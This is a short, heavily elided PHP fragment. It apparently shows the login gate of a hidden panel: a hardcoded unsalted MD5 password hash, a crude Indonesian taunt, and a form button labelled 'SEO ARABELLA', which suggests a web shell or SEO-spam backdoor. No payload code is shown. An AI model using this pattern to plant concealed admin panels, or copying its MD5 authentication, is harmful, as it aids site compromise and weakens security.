...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '287c55d58221ed7f1cb4f0c4acbeec1f'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        ...
        echo "Gatau Passwordnya Jangan Ngeyel Asu Akowkoakaw";
    }
}
...
if (is_logged_in()) {
    ...
    <body>
        <form method="POST" action="">
            ...
            <input type="submit" value="SEO ARABELLA">
        </form>
    </body>
    </html>
    <?php
